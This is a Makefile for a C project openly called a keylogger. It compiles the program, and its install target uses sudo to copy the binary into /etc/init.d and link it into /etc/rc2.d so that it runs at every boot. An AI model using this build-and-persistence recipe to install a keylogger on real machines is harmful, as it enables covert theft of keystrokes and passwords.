all: keylogger.out

install: all
	sudo cp keylogger.out /etc/init.d/keylogger
	sudo chmod +x /etc/init.d/keylogger
	sudo ln -s /etc/init.d/keylogger /etc/rc2.d/S99keylogger

keylogger.out: main.o help.o keylogger.o interproccess.o
	gcc -o keylogger.out objects/main.o objects/help.o objects/keylogger.o objects/interproccess.o

main.o: src/main.c src/help.h src/config.h
	gcc -o objects/main.o src/main.c -c -W -Wall

help.o: src/help.c src/help.h
	gcc -o objects/help.o src/help.c -c -W -Wall

keylogger.o: src/keylogger.c src/keylogger.h
	gcc -o objects/keylogger.o src/keylogger.c -c -W -Wall

interproccess.o:
	gcc -o objects/interproccess.o src/interproccess.c -c -W -Wall

clean:
	rm -rf objects/*.o *~ keylogger

